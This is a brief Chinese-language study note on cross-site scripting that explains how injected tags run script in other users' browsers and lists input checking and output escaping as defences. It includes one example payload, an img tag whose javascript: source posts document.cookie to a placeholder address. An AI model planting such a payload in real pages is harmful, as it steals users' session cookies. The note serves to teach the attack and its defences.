# 跨站脚本注入 (cross site scripting)

## 攻击示例：
根据image、script、iframe等标签的src会自动加载链接的特性，在用户输入中添加带有javascripts代码的标签。其它用户在载入恶意标签时触发代码，达到攻击目的。

```html
// 抓取用户cookie
<img src="javascript: fetch('目标地址', {method: 'post', body: document.cookie});">
```


## 防范措施
1. 前端检测用户输入
2. （除非在已知绝对安全的情况下）在将用户信息插入页面之前，对内容进行转义
